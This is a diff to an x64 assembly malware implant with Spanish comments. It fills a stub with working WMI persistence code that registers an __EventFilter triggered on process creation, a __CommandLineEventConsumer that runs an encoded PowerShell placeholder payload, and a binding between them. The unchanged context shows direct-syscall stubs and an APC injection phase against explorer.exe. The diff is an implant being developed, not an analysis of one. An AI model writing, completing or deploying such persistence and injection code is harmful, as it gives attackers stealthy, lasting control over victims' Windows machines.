@@ -374,8 +374,141 @@ payload_entry:
     js .apc_phase
     mov [rbx + (pWbemServices - payload_start)], rax
 
-    ; --- WMI PERSISTENCE (Bug 4) ---
-    ; [Omega-grade logic for permanent CIM subscription]
+    ; =====================================================================
+    ; PERSISTENCIA WMI: __EventFilter -> __CommandLineEventConsumer
+    ; =====================================================================
+.wmi_persistence:
+    ; --- 4. GetObject("__EventFilter") ---
+    mov rcx, [rbx + (pWbemServices - payload_start)]
+    lea rdx, [rbx + (wszEventFilter - payload_start)]
+    xor r8d, r8d
+    xor r9d, r9d
+    lea rax, [rbx + (pEventFilterClass - payload_start)]
+    push rax                         ; ppObject
+    push 0                           ; pCtx
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 48]                  ; IWbemServices::GetObject (x64)
+    add rsp, 0x30
+    test eax, eax
+    js .apc_phase
+    
+    ; --- 5. SpawnInstance de __EventFilter ---
+    mov rcx, [rbx + (pEventFilterClass - payload_start)]
+    lea rdx, [rbx + (pEventFilterInst - payload_start)]
+    push rdx
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 40]                  ; IWbemClassObject::SpawnInstance
+    add rsp, 0x28
+    
+    ; --- 6. Set Filter Name ---
+    mov rcx, [rbx + (pEventFilterInst - payload_start)]
+    lea rdx, [rbx + (wszName - payload_start)]
+    lea r8, [rbx + (wszFilterName - payload_start)]
+    call .wmi_put_string
+    
+    ; --- 7. Set Filter Query & Language ---
+    mov rcx, [rbx + (pEventFilterInst - payload_start)]
+    lea rdx, [rbx + (wszQueryLanguage - payload_start)]
+    lea r8, [rbx + (wszWQL - payload_start)]
+    call .wmi_put_string
+    
+    mov rcx, [rbx + (pEventFilterInst - payload_start)]
+    lea rdx, [rbx + (wszQuery - payload_start)]
+    lea r8, [rbx + (wszQueryStr - payload_start)]
+    call .wmi_put_string
+    
+    ; --- 8. PutInstance(__EventFilter) ---
+    mov rcx, [rbx + (pWbemServices - payload_start)]
+    mov rdx, [rbx + (pEventFilterInst - payload_start)]
+    xor r8d, r8d                     ; lFlags
+    xor r9d, r9d                     ; pCtx
+    push 0                           ; ppCallResult
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 112]                 ; IWbemServices::PutInstance
+    add rsp, 0x28
+
+    ; --- 9. Crear Consumer (__CommandLineEventConsumer) ---
+    mov rcx, [rbx + (pWbemServices - payload_start)]
+    lea rdx, [rbx + (wszConsumer - payload_start)]
+    lea r8, [rbx + (pConsumerClass - payload_start)]
+    push r8
+    push 0
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 48]                  ; GetObject
+    add rsp, 0x30
+    
+    mov rcx, [rbx + (pConsumerClass - payload_start)]
+    lea rdx, [rbx + (pConsumerInst - payload_start)]
+    push rdx
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 40]                  ; SpawnInstance
+    add rsp, 0x28
+    
+    ; --- 10. Set Consumer Name & CommandLine ---
+    mov rcx, [rbx + (pConsumerInst - payload_start)]
+    lea rdx, [rbx + (wszName - payload_start)]
+    lea r8, [rbx + (wszConsumerName - payload_start)]
+    call .wmi_put_string
+    
+    mov rcx, [rbx + (pConsumerInst - payload_start)]
+    lea rdx, [rbx + (wszCommandLine - payload_start)]
+    lea r8, [rbx + (wszPayload - payload_start)]
+    call .wmi_put_string
+    
+    ; --- 11. PutInstance(Consumer) ---
+    mov rcx, [rbx + (pWbemServices - payload_start)]
+    mov rdx, [rbx + (pConsumerInst - payload_start)]
+    push 0
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 112]                 ; PutInstance
+    add rsp, 0x28
+
+    ; --- 12. Crear Binding (__FilterToConsumerBinding) ---
+    mov rcx, [rbx + (pWbemServices - payload_start)]
+    lea rdx, [rbx + (wszBinding - payload_start)]
+    lea r8, [rbx + (pBindingClass - payload_start)]
+    push r8
+    push 0
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 48]
+    add rsp, 0x30
+    
+    mov rcx, [rbx + (pBindingClass - payload_start)]
+    lea rdx, [rbx + (pBindingInst - payload_start)]
+    push rdx
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 40]
+    add rsp, 0x28
+    
+    ; --- 13. Bind Filter and Consumer ---
+    mov rcx, [rbx + (pBindingInst - payload_start)]
+    lea rdx, [rbx + (wszFilter - payload_start)]
+    lea r8, [rbx + (wszFilterRef - payload_start)]
+    call .wmi_put_string
+    
+    mov rcx, [rbx + (pBindingInst - payload_start)]
+    lea rdx, [rbx + (wszConsumerKey - payload_start)]
+    lea r8, [rbx + (wszConsumerRef - payload_start)]
+    call .wmi_put_string
+    
+    ; --- 14. PutInstance(Binding) ---
+    mov rcx, [rbx + (pWbemServices - payload_start)]
+    mov rdx, [rbx + (pBindingInst - payload_start)]
+    push 0
+    sub rsp, 0x20
+    mov rax, [rcx]
+    call [rax + 112]
+    add rsp, 0x28
+
+    jmp .apc_phase
 
     ; =====================================================================
     ; FASE 2: INYECCIÓN APC EN EXPLORER.EXE
@@ -509,6 +642,43 @@ payload_entry:
     pop r8
     pop rdx
     pop rcx
+    ret
+
+; ========================================================================
+; HELPER: WMI Put String
+; RCX = pInstance, RDX = PropertyName, R8 = Value
+; ========================================================================
+.wmi_put_string:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 48                      ; Espacio para VARIANT (24 bytes) y shadow
+    push rbx
+    push rcx
+    
+    mov rbx, rcx                     ; rbx = pInstance
+    mov rcx, rdx
+    call .sys_alloc_bstr
+    mov r14, rax                     ; r14 = BSTR PropertyName
+    
+    mov rcx, r8
+    call .sys_alloc_bstr
+    mov r15, rax                     ; r15 = BSTR Value
+    
+    ; Preparar VARIANT (VT_BSTR)
+    lea rax, [rbp - 24]
+    mov word [rax], 8                ; VT_BSTR
+    mov [rax + 8], r15               ; val.bstrVal
+    
+    mov rcx, rbx
+    mov rdx, r14
+    xor r8d, r8d                     ; lFlags
+    lea r9, [rbp - 24]               ; pVal (VARIANT*)
+    mov rax, [rcx]
+    call [rax + 32]                  ; IWbemClassObject::Put
+    
+    pop rcx
+    pop rbx
+    leave
     ret
 
 ; ========================================================================
@@ -731,6 +901,13 @@ ssn_NtQuerySystemInformation  dd 0
 ssn_NtOpenProcess             dd 0
 ssn_NtOpenThread              dd 0
 
+pEventFilterClass             dq 0
+pEventFilterInst              dq 0
+pConsumerClass                dq 0
+pConsumerInst                 dq 0
+pBindingClass                 dq 0
+pBindingInst                  dq 0
+
 target_pid                    dd 0
 target_tid                    dd 0
 remote_base                   dq 0
@@ -758,6 +935,24 @@ IID_IWbemLocator:
     dw 0x737F
     dw 0x11CF
     db 0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24
+
+; --- WMI Persistence Strings ---
+wszEventFilter:     dw '_','_','E','v','e','n','t','F','i','l','t','e','r',0
+wszConsumer:        dw '_','_','C','o','m','m','a','n','d','L','i','n','e','E','v','e','n','t','C','o','n','s','u','m','e','r',0
+wszBinding:         dw '_','_','F','i','l','t','e','r','T','o','C','o','n','s','u','m','e','r','B','i','n','d','i','n','g',0
+wszName:            dw 'N','a','m','e',0
+wszQuery:           dw 'Q','u','e','r','y',0
+wszQueryLanguage:   dw 'Q','u','e','r','y','L','a','n','g','u','a','g','e',0
+wszFilterName:      dw 'N','e','v','e','r','T','r','s','t','F','i','l','t','e','r',0
+wszConsumerName:    dw 'N','e','v','e','r','T','r','s','t','C','o','n','s','u','m','e','r',0
+wszWQL:             dw 'W','Q','L',0
+wszQueryStr:        dw 'S','E','L','E','C','T',' ','*',' ','F','R','O','M',' ','_','_','I','n','s','t','a','n','c','e','C','r','e','a','t','i','o','n','E','v','e','n','t',' ','W','I','T','H','I','N',' ','5',' ','W','H','E','R','E',' ','T','a','r','g','e','t','I','n','s','t','a','n','c','e',' ','I','S','A',' ','"','W','i','n','3','2','_','P','r','o','c','e','s','s','"',0
+wszCommandLine:     dw 'C','o','m','m','a','n','d','L','i','n','e','T','e','m','p','l','a','t','e',0
+wszFilter:          dw 'F','i','l','t','e','r',0
+wszConsumerKey:     dw 'C','o','n','s','u','m','e','r',0
+wszFilterRef:       dw '_','_','E','v','e','n','t','F','i','l','t','e','r','.','N','a','m','e','=','"','N','e','v','e','r','T','r','s','t','F','i','l','t','e','r','"',0
+wszConsumerRef:     dw '_','_','C','o','m','m','a','n','d','L','i','n','e','E','v','e','n','t','C','o','n','s','u','m','e','r','.','N','a','m','e','=','"','N','e','v','e','r','T','r','s','t','C','o','n','s','u','m','e','r','"',0
+wszPayload:         dw 'p','o','w','e','r','s','h','e','l','l',' ','-','e','n','c',' ','_','_','P','A','Y','L','O','A','D','_','_',0
 
 payload_end:
 
